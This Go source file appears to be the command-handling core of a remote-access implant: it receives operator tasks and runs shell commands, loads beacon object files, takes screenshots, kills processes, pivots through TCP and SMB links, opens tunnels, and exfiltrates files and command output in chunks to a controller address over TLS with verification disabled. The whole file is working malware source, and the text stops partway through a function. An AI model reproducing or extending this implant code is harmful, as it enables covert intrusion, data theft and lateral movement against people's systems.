package main

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"errors"
	"fmt"
	"gopher/bof/coffer"
	"gopher/functions"
	"gopher/utils"
	"io"
	"net"
	"os"
	"os/exec"
	"strconv"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/vmihailenco/msgpack/v5"
)

var UPLOADS map[string][]byte
var DOWNLOADS map[string]utils.Connection
var JOBS map[string]utils.Connection
var TUNNELS sync.Map
var TERMINALS sync.Map

type TunnelConn struct {
	Conn           net.Conn
	Cancel         context.CancelFunc
	Paused         atomic.Bool
	mu             sync.Mutex
	writeMu        sync.Mutex
	outQueue       [][]byte
	writeQueue     [][]byte
	closed         bool
	connResultSent bool
	connSuccess    bool
	connReason     byte
	channelId      int
}

func TaskProcess(commands [][]byte) [][]byte {
	var (
		command utils.Command
		data    []byte
		result  [][]byte
		err     error
	)

	for _, cmdBytes := range commands {
		err = msgpack.Unmarshal(cmdBytes, &command)
		if err != nil {
			continue
		}

		switch command.Code {

		case utils.COMMAND_DOWNLOAD:
			data, err = jobDownloadStart(command.Data)

		case utils.COMMAND_CAT:
			data, err = taskCat(command.Data)

		case utils.COMMAND_CD:
			data, err = taskCd(command.Data)

		case utils.COMMAND_CP:
			data, err = taskCp(command.Data)

		case utils.COMMAND_EXEC_BOF:
			data, err = taskExecBof(command.Data)

		case utils.COMMAND_EXEC_BOF_ASYNC:
			data, err = jobExecBofAsync(command.Data)

		case utils.COMMAND_EXIT:
			data, err = taskExit()

		case utils.COMMAND_JOB_LIST:
			data, err = taskJobList()

		case utils.COMMAND_JOB_KILL:
			data, err = taskJobKill(command.Data)

		case utils.COMMAND_KILL:
			data, err = taskKill(command.Data)

		case utils.COMMAND_LS:
			data, err = taskLs(command.Data)

		case utils.COMMAND_MKDIR:
			data, err = taskMkdir(command.Data)

		case utils.COMMAND_MV:
			data, err = taskMv(command.Data)

		case utils.COMMAND_PS:
			data, err = taskPs()

		case utils.COMMAND_PWD:
			data, err = taskPwd()

		case utils.COMMAND_REV2SELF:
			data, err = taskRev2Self()

		case utils.COMMAND_RM:
			data, err = taskRm(command.Data)

		case utils.COMMAND_RUN:
			data, err = jobRun(command.Data)

		case utils.COMMAND_SHELL:
			data, err = taskShell(command.Data)

		case utils.COMMAND_SCREENSHOT:
			data, err = taskScreenshot()

		case utils.COMMAND_TERMINAL_START:
			jobTerminal(command.Data)
			continue

		case utils.COMMAND_TERMINAL_STOP:
			taskTerminalKill(command.Data)
			continue

		case utils.COMMAND_TUNNEL_START:
			jobTunnel(command.Data)
			continue

		case utils.COMMAND_TUNNEL_STOP:
			taskTunnelKill(command.Data)
			continue

		case utils.COMMAND_TUNNEL_PAUSE:
			taskTunnelPause(command.Data)
			continue

		case utils.COMMAND_TUNNEL_RESUME:
			taskTunnelResume(command.Data)
			continue

		case utils.COMMAND_TUNNEL_WRITE:
			taskTunnelWrite(command.Data)
			continue

		case utils.COMMAND_UPLOAD:
			data, err = taskUpload(command.Data)

		case utils.COMMAND_ZIP:
			data, err = taskZip(command.Data)

		case utils.COMMAND_LINK:
			data, err = taskLink(command.Id, command.Data)

		case utils.COMMAND_UNLINK:
			data, err = taskUnlink(command.Data)

		case utils.COMMAND_PIVOT_EXEC:
			if err = taskPivotExec(command.Data); err != nil {
				command.Code = utils.COMMAND_ERROR
				command.Data, _ = msgpack.Marshal(utils.AnsError{Error: err.Error()})
				packerData, _ := msgpack.Marshal(command)
				result = append(result, packerData)
			}
			continue

		default:
			continue
		}

		if err != nil {
			command.Code = utils.COMMAND_ERROR
			command.Data, _ = msgpack.Marshal(utils.AnsError{Error: err.Error()})
		} else {
			command.Data = data
		}

		packerData, _ := msgpack.Marshal(command)
		result = append(result, packerData)
	}

	return result
}


func taskCat(paramsData []byte) ([]byte, error) {
	var params utils.ParamsCat
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	fileInfo, err := os.Stat(path)
	if err != nil {
		return nil, err
	}
	if fileInfo.Size() > 0x100000 {
		return nil, fmt.Errorf("file size exceeds 1 Mb (use download)")
	}

	content, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	return msgpack.Marshal(utils.AnsCat{Path: params.Path, Content: content})
}

func taskCd(paramsData []byte) ([]byte, error) {
	var params utils.ParamsCd
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	err = os.Chdir(path)
	if err != nil {
		return nil, err
	}

	newPath, err := os.Getwd()
	if err != nil {
		return nil, err
	}

	return msgpack.Marshal(utils.AnsPwd{Path: newPath})
}

func taskCp(paramsData []byte) ([]byte, error) {
	var params utils.ParamsCp
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	srcPath, err := functions.NormalizePath(params.Src)
	if err != nil {
		return nil, err
	}
	dstPath, err := functions.NormalizePath(params.Dst)
	if err != nil {
		return nil, err
	}

	info, err := os.Stat(srcPath)
	if err != nil {
		return nil, err
	}

	if info.IsDir() {
		err = functions.CopyDir(srcPath, dstPath)
	} else {
		err = functions.CopyFile(srcPath, dstPath, info)
	}

	return nil, err
}

func taskExecBof(paramsData []byte) ([]byte, error) {
	var params utils.ParamsExecBof
	if err := msgpack.Unmarshal(paramsData, &params); err != nil {
		return nil, err
	}

	args, err := base64.StdEncoding.DecodeString(params.ArgsPack)
	if err != nil {
		args = make([]byte, 1)
	}

	msgs, err := coffer.Load(params.Object, args)
	if err != nil {
		return nil, err
	}

	list, _ := msgpack.Marshal(msgs)

	return msgpack.Marshal(utils.AnsExecBof{Msgs: list})
}

func taskExit() ([]byte, error) {
	ACTIVE = false
	return nil, nil
}

func taskJobList() ([]byte, error) {

	var jobList []utils.JobInfo
	for k, v := range DOWNLOADS {
		jobList = append(jobList, utils.JobInfo{JobId: k, JobType: v.PackType})
	}
	for k, v := range JOBS {
		jobList = append(jobList, utils.JobInfo{JobId: k, JobType: v.PackType})
	}

	list, _ := msgpack.Marshal(jobList)

	return msgpack.Marshal(utils.AnsJobList{List: list})
}

func taskJobKill(paramsData []byte) ([]byte, error) {
	var params utils.ParamsJobKill
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	job, ok := DOWNLOADS[params.Id]
	if !ok {
		job, ok = JOBS[params.Id]
		if !ok {
			return nil, fmt.Errorf("job '%s' not found", params.Id)
		}
	}

	if job.JobCancel != nil {
		job.JobCancel()
	}

	job.HandleCancel()

	return nil, nil
}

func taskKill(paramsData []byte) ([]byte, error) {
	var params utils.ParamsKill
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	proc, err := os.FindProcess(params.Pid)
	if err != nil {
		return nil, err
	}

	err = proc.Signal(syscall.SIGKILL)
	return nil, err
}

func taskLs(paramsData []byte) ([]byte, error) {
	var params utils.ParamsLs
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	Files, err := functions.GetListing(path)
	if err != nil {
		return msgpack.Marshal(utils.AnsLs{Result: false, Status: err.Error(), Path: path, Files: nil})
	}

	filesData, _ := msgpack.Marshal(Files)

	return msgpack.Marshal(utils.AnsLs{Result: true, Path: path, Files: filesData})
}

func taskMkdir(paramsData []byte) ([]byte, error) {
	var params utils.ParamsMkdir
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	mode := os.FileMode(0755)
	err = os.MkdirAll(path, mode)

	return nil, err
}

func taskMv(paramsData []byte) ([]byte, error) {
	var params utils.ParamsMv
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	srcPath, err := functions.NormalizePath(params.Src)
	if err != nil {
		return nil, err
	}
	dstPath, err := functions.NormalizePath(params.Dst)
	if err != nil {
		return nil, err
	}

	err = os.Rename(srcPath, dstPath)
	if err == nil {
		return nil, nil
	}

	info, err := os.Stat(srcPath)
	if err != nil {
		return nil, err
	}

	if info.IsDir() {
		err = functions.CopyDir(srcPath, dstPath)
		if err == nil {
			_ = os.RemoveAll(srcPath)
		}
	} else {
		err = functions.CopyFile(srcPath, dstPath, info)
		if err == nil {
			_ = os.Remove(srcPath)
		}
	}
	return nil, err
}

func taskPs() ([]byte, error) {
	Processes, err := functions.GetProcesses()
	if err != nil {
		return nil, err
	}

	processesData, _ := msgpack.Marshal(Processes)

	return msgpack.Marshal(utils.AnsPs{Result: true, Processes: processesData})
}

func taskPwd() ([]byte, error) {
	path, err := os.Getwd()
	if err != nil {
		return nil, err
	}

	return msgpack.Marshal(utils.AnsPwd{Path: path})
}

func taskRev2Self() ([]byte, error) {
	functions.Rev2Self()
	return nil, nil
}

func taskRm(paramsData []byte) ([]byte, error) {
	var params utils.ParamsRm
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	info, err := os.Stat(path)
	if err != nil {
		return nil, err
	}
	if info.IsDir() {
		err = os.RemoveAll(path)
	} else {
		err = os.Remove(path)
	}
	return nil, err
}

func taskScreenshot() ([]byte, error) {
	screenshot, err := functions.Screenshots()
	if err != nil {
		return nil, err
	}

	screens := make([][]byte, 0)
	for _, pic := range screenshot {
		screens = append(screens, pic)
	}

	return msgpack.Marshal(utils.AnsScreenshots{Screens: screens})
}

func taskShell(paramsData []byte) ([]byte, error) {
	var params utils.ParamsShell
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	cmd := exec.Command(params.Program, params.Args...)
	functions.ProcessSettings(cmd)
	output, _ := cmd.CombinedOutput()

	return msgpack.Marshal(utils.AnsShell{Output: string(output)})
}

func taskTerminalKill(paramsData []byte) {
	var params utils.ParamsTerminalStop
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return
	}

	value, ok := TERMINALS.Load(params.TermId)
	if ok {
		cancel, ok := value.(context.CancelFunc)
		if ok {
			cancel()
		}
	}
}

func taskTunnelKill(paramsData []byte) {
	var params utils.ParamsTunnelStop
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return
	}

	value, ok := TUNNELS.Load(params.ChannelId)
	if ok {
		tc, ok := value.(*TunnelConn)
		if ok {
			tc.Cancel()
			if tc.Conn != nil {
				tc.Conn.Close()
			}
		}
	}
}

func taskTunnelPause(paramsData []byte) {
	var params utils.ParamsTunnelPause
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return
	}

	value, ok := TUNNELS.Load(params.ChannelId)
	if ok {
		tc, ok := value.(*TunnelConn)
		if ok {
			tc.Paused.Store(true)
		}
	}
}

func enqueueTunnelWrite(tc *TunnelConn, data []byte) {
	if len(data) == 0 {
		return
	}
	packet := make([]byte, len(data))
	copy(packet, data)
	tc.mu.Lock()
	tc.writeQueue = append(tc.writeQueue, packet)
	tc.mu.Unlock()
}

func drainTunnelWrites(tc *TunnelConn) [][]byte {
	tc.mu.Lock()
	pending := tc.writeQueue
	tc.writeQueue = nil
	tc.mu.Unlock()
	return pending
}

func writeAll(conn net.Conn, data []byte) error {
	for len(data) > 0 {
		n, err := conn.Write(data)
		if n > 0 {
			data = data[n:]
		}
		if err != nil {
			return err
		}
		if n == 0 {
			return io.ErrShortWrite
		}
	}
	return nil
}

func flushTunnelWrites(tc *TunnelConn) error {
	if tc.Conn == nil {
		return errors.New("tunnel connection is nil")
	}
	for _, packet := range drainTunnelWrites(tc) {
		if err := writeAll(tc.Conn, packet); err != nil {
			return err
		}
	}
	return nil
}

func taskTunnelResume(paramsData []byte) {
	var params utils.ParamsTunnelResume
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return
	}

	value, ok := TUNNELS.Load(params.ChannelId)
	if ok {
		tc, ok := value.(*TunnelConn)
		if ok {
			tc.Paused.Store(false)
			tc.writeMu.Lock()
			err := flushTunnelWrites(tc)
			tc.writeMu.Unlock()
			if err != nil {
				tc.Cancel()
				if tc.Conn != nil {
					_ = tc.Conn.Close()
				}
			}
		}
	}
}

func taskTunnelWrite(paramsData []byte) {
	var params utils.ParamsTunnelWrite
	if err := msgpack.Unmarshal(paramsData, &params); err != nil {
		return
	}

	value, ok := TUNNELS.Load(params.ChannelId)
	if !ok {
		return
	}
	tc, ok := value.(*TunnelConn)
	if !ok || tc.Conn == nil {
		return
	}
	tc.writeMu.Lock()
	defer tc.writeMu.Unlock()

	if tc.Paused.Load() {
		enqueueTunnelWrite(tc, params.Data)
		return
	}

	if err := flushTunnelWrites(tc); err != nil {
		tc.Cancel()
		_ = tc.Conn.Close()
		return
	}

	if err := writeAll(tc.Conn, params.Data); err != nil {
		tc.Cancel()
		_ = tc.Conn.Close()
	}
}

func collectTunnelData() [][]byte {
	var results [][]byte
	var toDelete []int

	TUNNELS.Range(func(key, value interface{}) bool {
		tc, ok := value.(*TunnelConn)
		if !ok {
			return true
		}
		channelId := key.(int)

		if !tc.connResultSent {
			tc.connResultSent = true
			resultData, _ := msgpack.Marshal(utils.ParamsTunnelConnected{
				ChannelId: channelId,
				Success:   tc.connSuccess,
				Reason:    tc.connReason,
			})
			cmd, _ := msgpack.Marshal(utils.Command{
				Code: utils.COMMAND_TUNNEL_CONNECTED,
				Data: resultData,
			})
			results = append(results, cmd)
			if !tc.connSuccess {
				toDelete = append(toDelete, channelId)
				return true
			}
		}

		tc.mu.Lock()
		pending := tc.outQueue
		tc.outQueue = nil
		closed := tc.closed
		tc.mu.Unlock()

		for _, data := range pending {
			writeData, _ := msgpack.Marshal(utils.ParamsTunnelWrite{
				ChannelId: channelId,
				Data:      data,
			})
			cmd, _ := msgpack.Marshal(utils.Command{
				Code: utils.COMMAND_TUNNEL_WRITE,
				Data: writeData,
			})
			results = append(results, cmd)
		}

		if closed {
			closeData, _ := msgpack.Marshal(utils.ParamsTunnelStop{
				ChannelId: channelId,
			})
			cmd, _ := msgpack.Marshal(utils.Command{
				Code: utils.COMMAND_TUNNEL_STOP,
				Data: closeData,
			})
			results = append(results, cmd)
			toDelete = append(toDelete, channelId)
		}

		return true
	})

	for _, id := range toDelete {
		TUNNELS.Delete(id)
	}

	return results
}

func taskUpload(paramsData []byte) ([]byte, error) {
	var params utils.ParamsUpload
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	uploadBytes, ok := UPLOADS[path]
	if !ok {
		uploadBytes = params.Content
	} else {
		delete(UPLOADS, path)
		uploadBytes = append(uploadBytes, params.Content...)
	}

	if params.Finish {
		files, err := functions.UnzipBytes(uploadBytes)
		if err != nil {
			return nil, err
		}

		content, ok := files[params.Path]
		if !ok {
			return nil, errors.New("file not uploaded")
		}

		err = os.WriteFile(path, content, 0644)
		if err != nil {
			return nil, err
		}

	} else {
		UPLOADS[path] = uploadBytes
		return nil, nil
	}

	return msgpack.Marshal(utils.AnsUpload{Path: path})
}

func taskZip(paramsData []byte) ([]byte, error) {
	var params utils.ParamsZip
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	srcPath, err := functions.NormalizePath(params.Src)
	if err != nil {
		return nil, err
	}
	dstPath, err := functions.NormalizePath(params.Dst)
	if err != nil {
		return nil, err
	}

	info, err := os.Stat(srcPath)
	if err != nil {
		return nil, err
	}

	var content []byte
	if info.IsDir() {
		content, err = functions.ZipDirectory(srcPath)
	} else {
		content, err = functions.ZipFile(srcPath)
	}
	if err != nil {
		return nil, err
	}

	err = os.WriteFile(dstPath, content, 0644)
	if err != nil {
		return nil, err
	}

	return msgpack.Marshal(utils.AnsZip{Path: dstPath})
}

func taskLink(taskId uint, paramsData []byte) ([]byte, error) {
	var params utils.ParamsLink
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	switch params.Type {
	case utils.PIVOT_TYPE_TCP:
		return PIVOTTER.LinkTCP(uint32(taskId), params.Target, params.Port)
	case utils.PIVOT_TYPE_SMB:
		return PIVOTTER.LinkSMB(uint32(taskId), params)
	default:
		return nil, fmt.Errorf("unknown link type: %d", params.Type)
	}
}

func taskUnlink(paramsData []byte) ([]byte, error) {
	var params utils.ParamsUnlink
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}
	return PIVOTTER.Unlink(params.PivotId)
}

func taskPivotExec(paramsData []byte) error {
	var params utils.ParamsPivotExec
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return err
	}
	err = PIVOTTER.WritePivot(params.PivotId, params.Data)
	if err != nil {
	} else {
	}
	return err
}


func jobExecBofAsync(paramsData []byte) ([]byte, error) {

	var params utils.ParamsExecBof
	if err := msgpack.Unmarshal(paramsData, &params); err != nil {
		return nil, err
	}

	args, err := base64.StdEncoding.DecodeString(params.ArgsPack)
	if err != nil {
		args = make([]byte, 1)
	}

	asyncBof, errLoad := coffer.LoadAsync(params.Object, args, SignalWakeup)
	if errLoad != nil {
		return nil, errLoad
	}

	var conn net.Conn
	if profile.UseSSL {
		cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
		if certerr != nil {
			return nil, err
		}

		caCertPool := x509.NewCertPool()
		caCertPool.AppendCertsFromPEM(profile.CaCert)

		config := &tls.Config{
			Certificates:       []tls.Certificate{cert},
			RootCAs:            caCertPool,
			InsecureSkipVerify: true,
		}
		conn, err = tls.Dial("tcp", profile.Addresses[0], config)

	} else {
		conn, err = net.Dial("tcp", profile.Addresses[0])
	}
	if err != nil {
		return nil, err
	}

	connection := utils.Connection{
		PackType: utils.BOF_PACK,
		JobCancel: func() {
			asyncBof.Stop()
		},
	}
	connection.Ctx, connection.HandleCancel = context.WithCancel(context.Background())
	JOBS[params.Task] = connection

	go func() {
		bofFinished := false
		defer func() {
			if bofFinished {
				asyncBof.Cleanup()
			}
			connection.HandleCancel()
			_ = conn.Close()
			delete(JOBS, params.Task)
		}()

		jobPack, _ := msgpack.Marshal(utils.JobPack{Id: uint(AgentId), Type: profile.Type, Task: params.Task})
		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.BOF_PACK, Data: jobPack})
		jobMsg, _ = utils.EncryptData(jobMsg, encKey)

		if profile.BannerSize > 0 {
			_, err := functions.ConnRead(conn, profile.BannerSize)
			if err != nil {
				return
			}
		}

		_ = functions.SendMsg(conn, jobMsg)

		job := utils.Job{
			CommandId: utils.COMMAND_EXEC_BOF_ASYNC,
			JobId:     params.Task,
		}
		nullMsgs, _ := msgpack.Marshal(make([]utils.BofMsg, 0))
		job.Data, _ = msgpack.Marshal(utils.AnsExecBofAsync{Start: true, Msgs: nullMsgs})
		packedJob, _ := msgpack.Marshal(job)

		message := utils.Message{
			Type:   2,
			Object: [][]byte{packedJob},
		}
		sendData, _ := msgpack.Marshal(message)
		sendData, _ = utils.EncryptData(sendData, utils.SKey)
		functions.SendMsg(conn, sendData)


		var pendingMsgs []utils.BofMsg
		bofMsg := utils.BofMsg{}
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()

		running := true
		for running {
			select {
			case <-connection.Ctx.Done():
				running = false

			case msg, ok := <-asyncBof.Output:
				if !ok {
					running = false
					break
				}
				switch v := msg.(type) {
				case int:
					bofMsg.Type = v
				case []byte:
					bofMsg.Data = v
					pendingMsgs = append(pendingMsgs, bofMsg)
					bofMsg = utils.BofMsg{}
				default:
					bofMsg = utils.BofMsg{}
				}

			case <-ticker.C:
				if len(pendingMsgs) > 0 {
					packMsgs, _ := msgpack.Marshal(pendingMsgs)
					ansBofAsync := utils.AnsExecBofAsync{Msgs: packMsgs}

					job.Data, _ = msgpack.Marshal(ansBofAsync)
					packedJob, _ := msgpack.Marshal(job)

					message := utils.Message{
						Type:   2,
						Object: [][]byte{packedJob},
					}
					sendData, _ := msgpack.Marshal(message)
					sendData, _ = utils.EncryptData(sendData, utils.SKey)
					functions.SendMsg(conn, sendData)

					pendingMsgs = pendingMsgs[:0]
				}
			}
		}

		select {
		case <-asyncBof.Done:
			bofFinished = true
		case <-connection.Ctx.Done():
			select {
			case <-asyncBof.Done:
				bofFinished = true
			case <-time.After(3 * time.Second):
			}
		}

	drainLoop:
		for {
			select {
			case msg, ok := <-asyncBof.Output:
				if !ok {
					break drainLoop
				}
				switch v := msg.(type) {
				case int:
					bofMsg.Type = v
				case []byte:
					bofMsg.Data = v
					pendingMsgs = append(pendingMsgs, bofMsg)
					bofMsg = utils.BofMsg{}
				default:
					bofMsg = utils.BofMsg{}
				}
			default:
				break drainLoop
			}
		}

		if len(pendingMsgs) > 0 {
			packMsgs, _ := msgpack.Marshal(pendingMsgs)
			ansBofAsync := utils.AnsExecBofAsync{Msgs: packMsgs}

			job.Data, _ = msgpack.Marshal(ansBofAsync)
			packedJob, _ := msgpack.Marshal(job)

			message := utils.Message{
				Type:   2,
				Object: [][]byte{packedJob},
			}
			sendData, _ := msgpack.Marshal(message)
			sendData, _ = utils.EncryptData(sendData, utils.SKey)
			functions.SendMsg(conn, sendData)
		}


		job.Data, _ = msgpack.Marshal(utils.AnsExecBofAsync{Finish: true, Msgs: nullMsgs})
		packedJob, _ = msgpack.Marshal(job)

		message = utils.Message{
			Type:   2,
			Object: [][]byte{packedJob},
		}

		sendData, _ = msgpack.Marshal(message)
		sendData, _ = utils.EncryptData(sendData, utils.SKey)
		functions.SendMsg(conn, sendData)
	}()

	return nil, nil
}

func jobDownloadStart(paramsData []byte) ([]byte, error) {
	var params utils.ParamsDownload
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	info, err := os.Stat(path)
	if err != nil {
		return nil, err
	}

	size := info.Size() // тип int64

	if size > 4*1024*1024*1024 {
		return nil, errors.New("file too big (>4GB)")
	}

	var content []byte
	if info.IsDir() {
		content, err = functions.ZipDirectory(path)
		path += ".zip"
	} else {
		content, err = os.ReadFile(path)
	}
	if err != nil {
		return nil, err
	}

	var conn net.Conn
	if profile.UseSSL {
		cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
		if certerr != nil {
			return nil, err
		}

		caCertPool := x509.NewCertPool()
		caCertPool.AppendCertsFromPEM(profile.CaCert)

		config := &tls.Config{
			Certificates:       []tls.Certificate{cert},
			RootCAs:            caCertPool,
			InsecureSkipVerify: true,
		}
		conn, err = tls.Dial("tcp", profile.Addresses[0], config)

	} else {
		conn, err = net.Dial("tcp", profile.Addresses[0])
	}
	if err != nil {
		return nil, err
	}

	strFileId := params.Task
	FileId, _ := strconv.ParseInt(strFileId, 16, 64)

	connection := utils.Connection{
		PackType: utils.EXFIL_PACK,
		Conn:     conn,
	}
	connection.Ctx, connection.HandleCancel = context.WithCancel(context.Background())
	DOWNLOADS[strFileId] = connection

	go func() {
		defer func() {
			connection.HandleCancel()
			_ = conn.Close()
			delete(DOWNLOADS, strFileId)
		}()

		exfilPack, _ := msgpack.Marshal(utils.ExfilPack{Id: uint(AgentId), Type: profile.Type, Task: params.Task})
		exfilMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.EXFIL_PACK, Data: exfilPack})
		exfilMsg, _ = utils.EncryptData(exfilMsg, encKey)

		job := utils.Job{
			CommandId: utils.COMMAND_DOWNLOAD,
			JobId:     params.Task,
		}

		if profile.BannerSize > 0 {
			_, err := functions.ConnRead(conn, profile.BannerSize)
			if err != nil {
				return
			}
		}

		_ = functions.SendMsg(conn, exfilMsg)

		chunkSize := 0x100000 // 1MB
		totalSize := len(content)
		for i := 0; i < totalSize; i += chunkSize {

			end := i + chunkSize
			if end > totalSize {
				end = totalSize
			}
			start := i == 0
			finish := end == totalSize

			canceled := false

			select {
			case <-connection.Ctx.Done():
				finish = true
				canceled = true
			default:
			}

			job.Data, _ = msgpack.Marshal(utils.AnsDownload{FileId: int(FileId), Path: path, Content: content[i:end], Size: len(content), Start: start, Finish: finish, Canceled: canceled})
			packedJob, _ := msgpack.Marshal(job)

			message := utils.Message{
				Type:   2,
				Object: [][]byte{packedJob},
			}

			sendData, _ := msgpack.Marshal(message)
			sendData, _ = utils.EncryptData(sendData, utils.SKey)
			_ = functions.SendMsg(conn, sendData)

			if finish {
				break
			}
			time.Sleep(time.Millisecond * 100)
		}
	}()

	return nil, nil
}

func jobRun(paramsData []byte) ([]byte, error) {
	var params utils.ParamsRun
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	procCtx, procCancel := context.WithCancel(context.Background())
	cmd := exec.CommandContext(procCtx, params.Program, params.Args...)
	functions.ProcessSettings(cmd)
	stdoutPipe, err := cmd.StdoutPipe()
	if err != nil {
		procCancel()
		return nil, fmt.Errorf("stdout pipe error: %w", err)
	}
	stderrPipe, err := cmd.StderrPipe()
	if err != nil {
		procCancel()
		return nil, fmt.Errorf("stderr pipe error: %w", err)
	}

	var stdoutMu sync.Mutex
	var stderrMu sync.Mutex
	stdoutBuf := new(bytes.Buffer)
	stderrBuf := new(bytes.Buffer)

	err = cmd.Start()
	if err != nil {
		procCancel()
		return nil, fmt.Errorf("start error: %w", err)
	}
	pid := 0
	if cmd.Process != nil {
		pid = cmd.Process.Pid
	}

	var conn net.Conn
	if profile.UseSSL {
		cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
		if certerr != nil {
			procCancel()
			return nil, err
		}

		caCertPool := x509.NewCertPool()
		caCertPool.AppendCertsFromPEM(profile.CaCert)

		config := &tls.Config{
			Certificates:       []tls.Certificate{cert},
			RootCAs:            caCertPool,
			InsecureSkipVerify: true,
		}
		conn, err = tls.Dial("tcp", profile.Addresses[0], config)

	} else {
		conn, err = net.Dial("tcp", profile.Addresses[0])
	}
	if err != nil {
		procCancel()
		return nil, err
	}

	connection := utils.Connection{
		PackType:  utils.JOB_PACK,
		Conn:      conn,
		JobCancel: procCancel,
	}
	connection.Ctx, connection.HandleCancel = context.WithCancel(context.Background())
	JOBS[params.Task] = connection

	go func() {
		defer func() {
			procCancel()
			connection.HandleCancel()
			_ = conn.Close()
			delete(JOBS, params.Task)
		}()

		jobPack, _ := msgpack.Marshal(utils.JobPack{Id: uint(AgentId), Type: profile.Type, Task: params.Task})
		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.JOB_PACK, Data: jobPack})
		jobMsg, _ = utils.EncryptData(jobMsg, encKey)

		if profile.BannerSize > 0 {
			_, err := functions.ConnRead(conn, profile.BannerSize)
			if err != nil {
				return
			}
		}

		functions.SendMsg(conn, jobMsg)

		job := utils.Job{
			CommandId: utils.COMMAND_RUN,
			JobId:     params.Task,
		}

		job.Data, _ = msgpack.Marshal(utils.AnsRun{Pid: pid, Start: true})
		packedJob, _ := msgpack.Marshal(job)

		message := utils.Message{
			Type:   2,
			Object: [][]byte{packedJob},
		}

		sendData, _ := msgpack.Marshal(message)
		sendData, _ = utils.EncryptData(sendData, utils.SKey)
		functions.SendMsg(conn, sendData)

		var wg sync.WaitGroup
		wg.Add(2)

		go func() {
			defer wg.Done()
			buf := make([]byte, 2*1024)
			for {
				n, err := stdoutPipe.Read(buf)
				if n > 0 {
					stdoutMu.Lock()
					stdoutBuf.Write(buf[:n])
					stdoutMu.Unlock()
				}
				if err == io.EOF {
					break
				}
				if err != nil {
					break
				}
			}
		}()
		go func() {
			defer wg.Done()
			buf := make([]byte, 2*1024)
			for {
				n, err := stderrPipe.Read(buf)
				if n > 0 {
					stderrMu.Lock()
					stderrBuf.Write(buf[:n])
					stderrMu.Unlock()
				}
				if err == io.EOF {
					break
				}
				if err != nil {
					break
				}
			}
		}()

		done := make(chan struct{})
		var lastOutLen, lastErrLen int
		const maxChunkSize = 0x10000 // 65 Kb
		go func() {
			ticker := time.NewTicker(1 * time.Second)
			defer ticker.Stop()
			for {
				select {
				case <-done:
					return

				case <-ticker.C:
					ansRun := utils.AnsRun{Pid: pid}
					stdoutMu.Lock()
					out := stdoutBuf.String()
					stdoutMu.Unlock()
					if len(out) > lastOutLen {
						chunk := out[lastOutLen:]
						if len(chunk) > maxChunkSize {
							ansRun.Stdout = chunk[:maxChunkSize]
							lastOutLen += maxChunkSize
						} else {
							ansRun.Stdout = chunk
							lastOutLen = len(out)
						}
					}

					stderrMu.Lock()
					errOut := stderrBuf.String()
					stderrMu.Unlock()
					if len(errOut) > lastErrLen {
						chunk := errOut[lastErrLen:]
						if len(chunk) > maxChunkSize {
							ansRun.Stderr = chunk[:maxChunkSize]
							lastErrLen += maxChunkSize
						} else {
							ansRun.Stderr = chunk
							lastErrLen = len(errOut)
						}
					}

					if len(ansRun.Stdout) > 0 || len(ansRun.Stderr) > 0 {
						job.Data, _ = msgpack.Marshal(ansRun)
						packedJob, _ := msgpack.Marshal(job)

						message := utils.Message{
							Type:   2,
							Object: [][]byte{packedJob},
						}

						sendData, _ := msgpack.Marshal(message)
						sendData, _ = utils.EncryptData(sendData, utils.SKey)
						functions.SendMsg(conn, sendData)
					}
				}
			}
		}()

		time.Sleep(200 * time.Millisecond)
		err = cmd.Wait()
		wg.Wait()
		close(done)

		stdoutMu.Lock()
		finalOut := stdoutBuf.String()
		stdoutMu.Unlock()
		stderrMu.Lock()
		finalErrOut := stderrBuf.String()
		stderrMu.Unlock()

		for {
			ansRun := utils.AnsRun{Pid: pid}
			hasMore := false

			if len(finalOut) > lastOutLen {
				chunk := finalOut[lastOutLen:]
				if len(chunk) > maxChunkSize {
